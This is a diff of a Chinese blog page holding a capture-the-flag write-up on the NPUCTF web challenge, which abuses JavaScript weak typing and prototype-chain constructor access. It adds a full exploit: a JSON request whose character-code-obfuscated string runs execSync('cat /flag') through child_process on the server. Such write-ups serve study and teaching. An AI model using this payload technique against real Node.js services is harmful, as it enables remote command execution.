@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>NPUCTF 验证🐎 （JS弱类型+原型链） | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="NPUCTF 验证🐎 （JS弱类型+原型链） | 过客 » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="NPUCTF 验证🐎 （JS弱类型+原型链） | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="NPUCTF 验证🐎 （JS弱类型+原型链）"/>
-    <meta property="og:url" content="http://localhost:4000/post/XxOKeal9U/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/XxOKeal9U/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000">过客</a>
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -84,7 +84,7 @@
             <h1>NPUCTF 验证🐎 （JS弱类型+原型链）</h1>
             <span class="meta">
             	Posted on
-              2020-04-22，5 min read
+              2020-04-22，6 min read
             </span>
           </div>
         </div>
@@ -185,7 +185,7 @@ app.listen(80, '0.0.0.0', () =&gt; {
 这里可以用first=1 second=[1]
 服务端得到的数据是first=1  second=[1]
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1587560890221.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1587560890221.png" alt="" loading="lazy"></figure>
 <pre><code>至于MD5
 在进行比较时
 md5(&quot;1&quot;+key[0])
@@ -218,27 +218,31 @@ function (x){
 
 (Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))())
 可以看到。这里定义了Math。把传入的Math的constructor赋值
-具体是什么意思呢。这里是利用了JS的原型链。一开始Math并没有定义。如果我们直接传入Match。那么会是undefind。而payload中传入的是Math+1。此时类型就变成了object1
+具体是什么意思呢。这里是利用了JS的原型链。一开始Math并没有定义。如果我们直接传入Match。那么会是object。而payload中传入的是Math+1。此时类型就变成了object1。object对象和字符串进行拼接。那么会转换为string类型
 为了清楚。我们重写下代码
 test=Math.constructor
-返回object类型的原型。string
+返回string类型的原型。string
 test2=test.constructor
-返回string类型的原型。function
+返回string原型的原型。function
 也就是通过一个object1从原型链上获取了string和function两种类型
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1587561892649.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://guokeya.github.io/post-images/1587561892649.png" alt="" loading="lazy"></figure>
 <pre><code>fromCharCode函数必须是在string类型上用。
 Math=Math.constructor
 #定义了string类型
 Math=Math.construtor
 #定义了function类型
 Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()
+等同于
 function(string.fromCharCode(xxxxxxxxx)()
+</code></pre>
+<p>完整exp</p>
+<pre><code>{&quot;e&quot;:&quot;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:1,&quot;second&quot;:[1]}
 </code></pre>
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/bBSaaelaQ/">
+            <a href="https://guokeya.github.io/post/bBSaaelaQ/">
               <span class="post-title">
                 PyCalX 1&amp;2&rarr;
               </span>
@@ -273,7 +277,7 @@ function(string.fromCharCode(xxxxxxxxx)()
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -288,10 +292,10 @@ function(string.fromCharCode(xxxxxxxxx)()
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
